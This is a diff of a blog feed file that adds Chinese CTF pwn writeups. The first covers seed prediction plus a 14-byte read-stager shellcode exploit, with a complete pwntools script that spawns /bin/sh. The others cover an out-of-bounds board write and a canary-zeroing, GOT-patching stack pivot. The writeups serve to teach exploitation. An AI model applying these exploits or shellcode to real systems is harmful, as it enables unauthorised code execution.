-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+<p>在 seed &#x3D; int(time.time()) 那里，由于远程可能会有延迟，所以远程时需要 -1 秒。</p>
+<p>很完美，本地预测随机数和程序生成的随机数一模一样，说明这个方法完全可行，只要本地生成之后的随机数，就可以反推出每个tile需要swap多少次，第一个困难已经解决。接下来，我们需要考虑这里的shellcode应该如何布置。</p>
+<p><img src="/images/26-02-09-scrabASM/test.png" alt="image-20260209162215228"></p>
+<p>这里先来看一下执行 0x13370000 时的寄存器状态</p>
+<p><img src="/images/26-02-09-scrabASM/register.png" alt="image-20260209163230746"></p>
+<p>很明显，这些寄存器状态无法直接构造 14 字节的 shellcode （execve）。但是，仔细查看源码，虽然只限制读入 14 字节的机器码，但是却分配了 0x1000 字节的可读可写可执行区域。思考：对于14字节shellcode，我们无法直接构造execve，那是否可以构造一个read，然后在此区域读取更多字节，给execve的shellcode创造足够的空间？</p>
+<p>利用当前寄存器状态，我构造了如下字节序列</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">0x48</span>, <span class="number">0x87</span>, <span class="number">0xfe</span>,       <span class="comment"># xchg rdi, rsi    ; rsi 已是 0x13370000</span></span><br><span class="line"><span class="number">0x6a</span>, <span class="number">0x00</span>,             <span class="comment"># push 0</span></span><br><span class="line"><span class="number">0x5f</span>,                   <span class="comment"># pop rdi          ; rdi = 0 (stdin)</span></span><br><span class="line"><span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xd6</span>,       <span class="comment"># add rsi, rdx     ; rsi = 0x1337000e (因为 rdx=14)</span></span><br><span class="line"><span class="number">0x5a</span>,                   <span class="comment"># pop rdx          ; rdx = 栈上的大数值</span></span><br><span class="line"><span class="number">0x31</span>, <span class="number">0xc0</span>,             <span class="comment"># xor eax, eax     ; rax = 0 (read)</span></span><br><span class="line"><span class="number">0x0f</span>, <span class="number">0x05</span>              <span class="comment"># syscall          ; read(0, 0x1337000e, 大数值)</span></span><br></pre></td></tr></table></figure>
 
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+<p>刚好14字节，这里利用栈上的数据（肯定远远大于14）作为 rdx，构造出一个read(0, 0x1337000e, 大数值)，并且读入的位置刚好时syscall后面，就紧接着执行第二次输入的shellcode（execve），获得shell</p>
+<p>思路如上，之后因为需要多次swap，又加了一些自动化swap脚本，然后就可以获得shell。远程连接时如果需要swap的次数太多可能会被服务器给ban了，导致执行到一半就EOF，多打几次应该就行，反正本地挺稳的。我觉得这道题是有难度的，但看解出的人很多，可能我把它想复杂了也不一定。。。</p>
+<p><img src="/images/26-02-09-scrabASM/shell.png" alt="image-20260209170155209"></p>
+<p>完整exp如下</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = ctypes.CDLL(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">libc.srand.argtypes = [ctypes.c_uint]</span><br><span class="line">libc.rand.restype = ctypes.c_int</span><br><span class="line"></span><br><span class="line">HAND_SIZE = <span class="number">14</span></span><br><span class="line">MAX_SWAP_TRIES = <span class="number">20000</span>   <span class="comment"># 防止死循环，足够大</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./scrabASM&quot;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;chall.lac.tf&#x27;, 31338)</span></span><br><span class="line"></span><br><span class="line">TARGET = [</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x87</span>, <span class="number">0xfe</span>,       <span class="comment"># xchg rdi, rsi    ; rsi 已是 0x13370000</span></span><br><span class="line">    <span class="number">0x6a</span>, <span class="number">0x00</span>,             <span class="comment"># push 0</span></span><br><span class="line">    <span class="number">0x5f</span>,                   <span class="comment"># pop rdi          ; rdi = 0 (stdin)</span></span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x01</span>, <span class="number">0xd6</span>,       <span class="comment"># add rsi, rdx     ; rsi = 0x1337000e (因为 rdx=14)</span></span><br><span class="line">    <span class="number">0x5a</span>,                   <span class="comment"># pop rdx          ; rdx = 栈上的大数值</span></span><br><span class="line">    <span class="number">0x31</span>, <span class="number">0xc0</span>,             <span class="comment"># xor eax, eax     ; rax = 0 (read)</span></span><br><span class="line">    <span class="number">0x0f</span>, <span class="number">0x05</span>              <span class="comment"># syscall          ; read(0, 0x1337000e, 大数值)</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接收初始 hand</span></span><br><span class="line">p.recvuntil(<span class="string">b&quot;Your starting tiles:\n&quot;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">line = p.recvline().decode()</span><br><span class="line">hexes = re.findall(<span class="string">r&#x27;([0-9a-fA-F]&#123;2&#125;)&#x27;</span>, line) <span class="comment"># 提取 14 个 hex</span></span><br><span class="line">real = [<span class="built_in">int</span>(x,<span class="number">16</span>) <span class="keyword">for</span> x <span class="keyword">in</span> hexes[:<span class="number">14</span>]]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 预测种子</span></span><br><span class="line">seed = <span class="built_in">int</span>(time.time())<span class="comment"># - 1</span></span><br><span class="line">libc.srand(seed)</span><br><span class="line">pred = [libc.rand() &amp; <span class="number">0xFF</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>)]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;真实:&quot;</span>, <span class="string">&#x27; &#x27;</span>.join(<span class="string">f&quot;<span class="subst">&#123;x:02x&#125;</span>&quot;</span> <span class="keyword">for</span> x <span class="keyword">in</span> real))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;预测:&quot;</span>, <span class="string">&#x27; &#x27;</span>.join(<span class="string">f&quot;<span class="subst">&#123;x:02x&#125;</span>&quot;</span> <span class="keyword">for</span> x <span class="keyword">in</span> pred))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;匹配?&quot;</span>, real == pred)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> real != pred:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;预测与实际不匹配，脚本退出&quot;</span>)</span><br><span class="line">    p.close()</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;种子匹配成功！&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ────────────────────────────────────────────────</span></span><br><span class="line"><span class="comment"># 匹配成功 → 继续生成后续 rand 序列，并计算 swap 次数</span></span><br><span class="line"><span class="comment"># ────────────────────────────────────────────────</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重新同步随机数生成器</span></span><br><span class="line">libc.srand(seed)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(HAND_SIZE):</span><br><span class="line">    libc.rand()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成后续可用的 rand 值（足够多）</span></span><br><span class="line">future_rand = []</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(MAX_SWAP_TRIES + <span class="number">100</span>):</span><br><span class="line">    future_rand.append(libc.rand() &amp; <span class="number">0xFF</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n后续 rand 值已生成（前10个示例）：&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27; &#x27;</span>.join(<span class="string">f&quot;<span class="subst">&#123;x:02x&#125;</span>&quot;</span> <span class="keyword">for</span> x <span class="keyword">in</span> future_rand[:<span class="number">10</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">current_hand = real[:]              <span class="comment"># 当前 hand 状态</span></span><br><span class="line">swap_counts = [<span class="number">0</span>] * HAND_SIZE       <span class="comment"># 记录每个位置需要 swap 多少次</span></span><br><span class="line">rand_idx = <span class="number">0</span>                        <span class="comment"># 指向 future_rand 的下标</span></span><br><span class="line">unfinished = <span class="built_in">set</span>(<span class="built_in">range</span>(HAND_SIZE))  <span class="comment"># 未完成的 tile</span></span><br><span class="line">execution_order = []                <span class="comment"># 记录处理顺序 (pos, times)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> unfinished:</span><br><span class="line">    best_pos = <span class="literal">None</span></span><br><span class="line">    best_tries = <span class="built_in">float</span>(<span class="string">&#x27;inf&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">list</span>(unfinished):</span><br><span class="line">        target = TARGET[pos]</span><br><span class="line">        <span class="keyword">if</span> current_hand[pos] == target:</span><br><span class="line">            unfinished.remove(pos)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 从当前 rand_idx 开始找最早匹配</span></span><br><span class="line">        <span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(MAX_SWAP_TRIES):</span><br><span class="line">            idx = rand_idx + offset</span><br><span class="line">            <span class="keyword">if</span> idx &gt;= <span class="built_in">len</span>(future_rand):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> future_rand[idx] == target:</span><br><span class="line">                tries = offset + <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> tries &lt; best_tries:</span><br><span class="line">                    best_tries = tries</span><br><span class="line">                    best_pos = pos</span><br><span class="line">                <span class="keyword">break</span>  <span class="comment"># 找到最早的就停，不用再找更远的</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> best_pos <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;!!! 无法完成所有 tile，建议增大 MAX_SWAP_TRIES 或简化 TARGET&quot;</span>)</span><br><span class="line">        p.close()</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 记录顺序和次数</span></span><br><span class="line">    execution_order.append((best_pos, best_tries))</span><br><span class="line">    swap_counts[best_pos] = best_tries</span><br><span class="line">    current_hand[best_pos] = TARGET[best_pos]</span><br><span class="line">    rand_idx += best_tries</span><br><span class="line">    unfinished.remove(best_pos)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出结果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\nSwap 计划（贪心顺序）：&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> idx, (pos, times) <span class="keyword">in</span> <span class="built_in">enumerate</span>(execution_order, <span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> times &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;idx:2d&#125;</span>. tile <span class="subst">&#123;pos:2d&#125;</span> → <span class="subst">&#123;times&#125;</span> 次&quot;</span>)</span><br><span class="line"></span><br><span class="line">total = <span class="built_in">sum</span>(swap_counts)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;总 swap 次数：<span class="subst">&#123;total&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ────────────────────────────────────────────────</span></span><br><span class="line"><span class="comment"># 自动化发送 swap 指令</span></span><br><span class="line"><span class="comment"># ────────────────────────────────────────────────</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span> + <span class="string">&quot;=&quot;</span>*<span class="number">60</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;开始自动执行 swap 操作...&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;总 swap 次数：<span class="subst">&#123;<span class="built_in">sum</span>(swap_counts)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> pos, times <span class="keyword">in</span> execution_order:  <span class="comment"># 按贪心顺序</span></span><br><span class="line">    <span class="keyword">if</span> times &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;tile <span class="subst">&#123;pos:2d&#125;</span> 需要 swap <span class="subst">&#123;times&#125;</span> 次&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(times):</span><br><span class="line">        <span class="comment"># 每次都完整发一次 &quot;1&quot; + tile</span></span><br><span class="line">        p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;1&quot;</span>)</span><br><span class="line">        p.sendlineafter(<span class="string">b&quot;(0-13): &quot;</span>, <span class="built_in">str</span>(pos).encode())</span><br><span class="line">        time.sleep(<span class="number">0.01</span> + random.uniform(<span class="number">0</span>, <span class="number">0.02</span>))<span class="comment"># 延迟调小一点，随机防检测</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;所有 swap 已发送完成！&quot;</span>)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">gdb.attach(p)</span></span><br><span class="line"><span class="string">pause()</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 发送 play</span></span><br><span class="line">p.sendlineafter(<span class="string">b&quot;&gt; &quot;</span>, <span class="string">b&quot;2&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n已发送 Play！现在应该进入 read(0) 阶段&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 自动发送 execve /bin/sh shellcode</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">shellcode = (</span><br><span class="line">    <span class="string">b&quot;\x48\x31\xd2&quot;</span>             <span class="comment"># xor rdx, rdx</span></span><br><span class="line">    <span class="string">b&quot;\x52&quot;</span>                     <span class="comment"># push rdx</span></span><br><span class="line">    <span class="string">b&quot;\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68&quot;</span>  <span class="comment"># mov rax, &quot;/bin//sh&quot;</span></span><br><span class="line">    <span class="string">b&quot;\x50&quot;</span>                     <span class="comment"># push rax</span></span><br><span class="line">    <span class="string">b&quot;\x48\x89\xe7&quot;</span>             <span class="comment"># mov rdi, rsp</span></span><br><span class="line">    <span class="string">b&quot;\x52&quot;</span>                     <span class="comment"># push rdx</span></span><br><span class="line">    <span class="string">b&quot;\x57&quot;</span>                     <span class="comment"># push rdi</span></span><br><span class="line">    <span class="string">b&quot;\x48\x89\xe6&quot;</span>             <span class="comment"># mov rsi, rsp</span></span><br><span class="line">    <span class="string">b&quot;\x48\x31\xc0&quot;</span>             <span class="comment"># xor rax, rax</span></span><br><span class="line">    <span class="string">b&quot;\xb0\x3b&quot;</span>                 <span class="comment"># mov al, 0x3b</span></span><br><span class="line">    <span class="string">b&quot;\x0f\x05&quot;</span>                 <span class="comment"># syscall</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
 ]]></content>
+      <categories>
+        <category>Writeup</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>random-seed，shellcode</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CTF题解：Tic-Tac-Toe</title>
+    <url>/2026/02/09/2026-02-09-Tic-Tac-Toe/</url>
+    <content><![CDATA[<h1 id="Tic-Tac-Toe"><a href="#Tic-Tac-Toe" class="headerlink" title="Tic-Tac-Toe"></a>Tic-Tac-Toe</h1><h2 id="一、题目分析"><a href="#一、题目分析" class="headerlink" title="一、题目分析"></a>一、题目分析</h2><p>分析源码，winner &#x3D; checkWin()，只要player &#x3D;&#x3D; winner即可获得flag。当然，这里目标不是简单的下棋赢，因为玩家在这个程序里下井字棋要么输要么平局，我们需要找到另一种方式让winner &#x3D;&#x3D; player</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (winner == player) &#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;How&#x27;s this possible? Well, I guess I&#x27;ll have to give you the flag now.\n&quot;</span>);</span><br><span class="line">   FILE* flag = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">   <span class="type">char</span> buf[<span class="number">256</span>];</span><br><span class="line">   fgets(buf, <span class="number">256</span>, flag);</span><br><span class="line">   buf[<span class="built_in">strcspn</span>(buf, <span class="string">&quot;\n&quot;</span>)] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">   <span class="built_in">puts</span>(buf);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;Nice try, but I&#x27;m still unbeatable.\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>首先查看一下程序如何判定winner。很明显，checkWin函数会返回 O 或 X，根据程序开头的定义：char player &#x3D; ‘X’;char computer &#x3D; ‘O’;，期望的返回值应该是X。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">checkWin</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (board[<span class="number">3</span>*i] == board[<span class="number">3</span>*i+<span class="number">1</span>] &amp;&amp; board[<span class="number">3</span>*i] == board[<span class="number">3</span>*i+<span class="number">2</span>] &amp;&amp; board[<span class="number">3</span>*i] != <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">         <span class="keyword">return</span> board[<span class="number">3</span>*i];</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">3</span>; i++) &#123;</span><br><span class="line">      <span class="keyword">if</span> (board[i] == board[<span class="number">3</span>+i] &amp;&amp; board[i] == board[<span class="number">6</span>+i] &amp;&amp; board[i] != <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">         <span class="keyword">return</span> board[i];</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">if</span> (board[<span class="number">0</span>] == board[<span class="number">4</span>] &amp;&amp; board[<span class="number">0</span>] == board[<span class="number">8</span>] &amp;&amp; board[<span class="number">0</span>] != <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">      <span class="keyword">return</span> board[<span class="number">0</span>];</span><br><span class="line">   <span class="keyword">if</span> (board[<span class="number">2</span>] == board[<span class="number">4</span>] &amp;&amp; board[<span class="number">2</span>] == board[<span class="number">6</span>] &amp;&amp; board[<span class="number">2</span>] != <span class="string">&#x27; &#x27;</span>)</span><br><span class="line">      <span class="keyword">return</span> board[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>再看playerMove函数，index检查不严密，并且 board[index] &#x3D; player 会将player覆写对应索引的内存，于是想到能否通过计算获得一个index指向 char computer &#x3D; ‘O’，然后board[index] &#x3D; player将此处内存覆盖为 X，这样棋盘上将不会出现 O，checkWin函数的返回值永远是 X，winner &#x3D;&#x3D; player</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">playerMove</span><span class="params">()</span> &#123;</span><br><span class="line">   <span class="type">int</span> x, y;</span><br><span class="line">   <span class="keyword">do</span>&#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Enter row #(1-3): &quot;</span>);</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Enter column #(1-3): &quot;</span>);</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;y);</span><br><span class="line">      <span class="type">int</span> index = (x<span class="number">-1</span>)*<span class="number">3</span>+(y<span class="number">-1</span>);</span><br><span class="line">      <span class="keyword">if</span>(index &gt;= <span class="number">0</span> &amp;&amp; index &lt; <span class="number">9</span> &amp;&amp; board[index] != <span class="string">&#x27; &#x27;</span>)&#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;Invalid move.\n&quot;</span>);</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">         board[index] = player; <span class="comment">// Should be safe, given that the user cannot overwrite tiles on the board</span></span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;<span class="keyword">while</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="二、漏洞"><a href="#二、漏洞" class="headerlink" title="二、漏洞"></a>二、漏洞</h2><p>接下来需要确定player和computer的内存布局，使用gdb调试。</p>
+<p><img src="/images/26-02-09-Tic-Tac-Toe/%E5%86%85%E5%AD%98.png" alt="image-20260209152301225"></p>
+<p>可以看到，在 -23 的位置就是 computer 的内存，playerMove函数里有 int index &#x3D; (x-1)*3+(y-1);，计算一下(x-1)3+(y-1)&#x3D;-23，可以让 x&#x3D;0 、y&#x3D;-19，输入即可将 computer 的内存改成X</p>
+<p><img src="/images/26-02-09-Tic-Tac-Toe/%E5%86%85%E5%AD%982.png" alt="image-20260209152908305"></p>
+<p>之后棋盘上就不会出现 O，随便下棋让 X 连成 3 个就可以赢，获得flag。</p>
+]]></content>
+      <categories>
+        <category>Writeup</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CTF题解：许哥的游戏</title>
+    <url>/2025/12/07/2025-12-07-%E8%AE%B8%E5%93%A5%E7%9A%84%E6%B8%B8%E6%88%8F/</url>
+    <content><![CDATA[<h1 id="许哥的游戏"><a href="#许哥的游戏" class="headerlink" title="许哥的游戏"></a>许哥的游戏</h1><h2 id="一、程序分析"><a href="#一、程序分析" class="headerlink" title="一、程序分析"></a>一、程序分析</h2><p><img src="/images/%E8%AE%B8%E5%93%A5%E7%9A%84%E6%B8%B8%E6%88%8F/checksec.png" alt="image-20251203135321711"></p>
+<p><img src="/images/%E8%AE%B8%E5%93%A5%E7%9A%84%E6%B8%B8%E6%88%8F/alarm.png" alt="xxxx"></p>
+<ol>
+<li><p>checksec发现需要绕过canary</p>
+</li>
+<li><p>alarm+5里有syscall</p>
+<blockquote>
+<p>注意：libc-2.27.so特有</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#patch为指定动态链接库</span></span><br><span class="line">patchelf --set-interpreter ./ld-2.27.so ./attachment</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#exp里指定libc</span></span><br><span class="line">sh = process(<span class="string">&#x27;./attachment&#x27;</span>,</span><br><span class="line">	env=&#123;<span class="string">&#x27;LD_PRELOAD&#x27;</span>: <span class="string">&#x27;./libc-2.27.so&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;LD_LIBRARY_PATH&#x27;</span>: <span class="string">&#x27;.&#x27;</span>&#125;)</span><br></pre></td></tr></table></figure>
+
+</blockquote>
+</li>
+<li><p>Weapon</p>
+<p>&#x3D;&#x3D;&gt;set_zero，任意地址写0</p>
+<p><img src="/images/%E8%AE%B8%E5%93%A5%E7%9A%84%E6%B8%B8%E6%88%8F/set.png" alt="image-20251205102032289"></p>
+</li>
+<li><p>Fight（close(1)和close(2)关闭标准输出和标准错误</p>
+<p>&#x3D;&#x3D;&gt;challenge3，存在溢出</p>
+<p><img src="/images/%E8%AE%B8%E5%93%A5%E7%9A%84%E6%B8%B8%E6%88%8F/challenge3.png" alt="image-20251205102137346"></p>
+</li>
+</ol>
+<h2 id="二、调试过程"><a href="#二、调试过程" class="headerlink" title="二、调试过程"></a>二、调试过程</h2><h3 id="（一）challenge3确认偏移"><a href="#（一）challenge3确认偏移" class="headerlink" title="（一）challenge3确认偏移"></a>（一）challenge3确认偏移</h3><p>在pwndbg中，cyclic 240（反编译中看到缓冲区248），进入challenge3后输入，Ctrl C中断</p>
+<p><img src="/images%5C%E8%AE%B8%E5%93%A5%E7%9A%84%E6%B8%B8%E6%88%8F%5Cfinally.png"></p>
+<p>stack 50查看栈布局</p>
+<p><img src="/images/%E8%AE%B8%E5%93%A5%E7%9A%84%E6%B8%B8%E6%88%8F/canary.png" alt="image-20251205102850007"></p>
+<p>可以看到rbp前就是canary，所以偏移：<code>248+canary+rbp+return_addr</code></p>
+<h3 id="（二）size-zero写-tls-中-canary-为0"><a href="#（二）size-zero写-tls-中-canary-为0" class="headerlink" title="（二）size_zero写 tls 中 canary 为0"></a>（二）size_zero写 tls 中 canary 为0</h3><h4 id="i）利用原理"><a href="#i）利用原理" class="headerlink" title="i）利用原理"></a>i）利用原理</h4><ol>
+<li><strong>任意地址写 0</strong>：<ul>
+<li><code>str</code> 是一个全局变量（地址固定）</li>
+<li><code>lVar1</code> 是用户输入的有符号长整数</li>
+<li>最终写入地址：<code>str + lVar1</code></li>
+<li>写入内容：8 字节的 0（<code>undefined8</code> 表示 8 字节）</li>
+</ul>
+</li>
+<li><strong>目标：tls 中的 canary</strong>：<ul>
+<li>在 Linux x64 中，栈保护 canary 存储在 TLS（Thread Local Storage）中</li>
+<li>位置：<code>fs:[0x28]</code>（或 <code>gs:[0x28]</code>，取决于编译）</li>
+<li>每次函数开始时从 <code>fs:[0x28]</code> 加载到栈上</li>
+<li>函数结束前检查栈上的值是否与 <code>fs:[0x28]</code> 中的一致</li>
+</ul>
+</li>
+</ol>
+<h4 id="ii）寻找-tls-canary-地址"><a href="#ii）寻找-tls-canary-地址" class="headerlink" title="ii）寻找 tls canary 地址"></a>ii）寻找 tls canary 地址</h4><ol>
+<li><p>首先在pwndbg中 info registers</p>
+<p><img src="/images/%E8%AE%B8%E5%93%A5%E7%9A%84%E6%B8%B8%E6%88%8F/fs.png"></p>
+<p>看到 fs 基址为0x794eabc8c580</p>
+</li>
+<li><p>再 x&#x2F;gx 查看0x28偏移处，通过 stack 20 确认到这里确实是 canary 的地方</p>
+<p><img src="/images/%E8%AE%B8%E5%93%A5%E7%9A%84%E6%B8%B8%E6%88%8F/0x28.png" alt="dd"><img src="C:\Users\WH\AppData\Roaming\Typora\typora-user-images\image-20251207111715732.png" alt="image-20251207111715732"></p>
+</li>
+<li><p>因为要加上str指针，所以再查看一下str处的数据</p>
+<p><img src="/images/%E8%AE%B8%E5%93%A5%E7%9A%84%E6%B8%B8%E6%88%8F/str.png"></p>
+<p><img src="/images/%E8%AE%B8%E5%93%A5%E7%9A%84%E6%B8%B8%E6%88%8F/data.png"></p>
+<p>所以我们需要的输入：<code>0x794eabc8c580 + 0x28 - 0x794eabc8a000 = 0x25a8</code></p>
+</li>
+</ol>
+<h3 id="（三）bless第二关改-alarm-为-syscall"><a href="#（三）bless第二关改-alarm-为-syscall" class="headerlink" title="（三）bless第二关改 alarm 为 syscall"></a>（三）bless第二关改 alarm 为 syscall</h3><p><img src="/images/%E8%AE%B8%E5%93%A5%E7%9A%84%E6%B8%B8%E6%88%8F/attack.png" alt="image-20251207113247398"></p>
+<p>这里有任意地址加5，刚好匹配 alarm + 5 &#x3D; syscall，可以改got表。</p>
+<p>bless后验证一下：</p>
+<p><img src="/images/%E8%AE%B8%E5%93%A5%E7%9A%84%E6%B8%B8%E6%88%8F/bless.png" alt="image-20251207113128649"></p>
+<h2 id="三、漏洞利用"><a href="#三、漏洞利用" class="headerlink" title="三、漏洞利用"></a>三、漏洞利用</h2><p>最后，在栈溢出部分，有 rbp 的 off-by-null，可以将rbp的最后一个字节覆盖为0，刚好是前面缓冲区22个ret的地址，而且由于执行到了challenge3和Fight的末尾，有两个<code>leave，ret</code>刚好可以<strong>栈迁移</strong>到缓冲区，执行ROP链</p>
+<blockquote>
+<p>注：ret相当于 pop rip ; rip &#x3D; [rsp] ; rsp &#x3D; rsp + 8，所以把alarm@got(即syscall&#x3D;0x602058) pop到rsp里，再通过ret访问got表对应的真实地址</p>
+</blockquote>
+<p><img src="/images/%E8%AE%B8%E5%93%A5%E7%9A%84%E6%B8%B8%E6%88%8F/stack.png"></p>
+<p>exp如下</p>
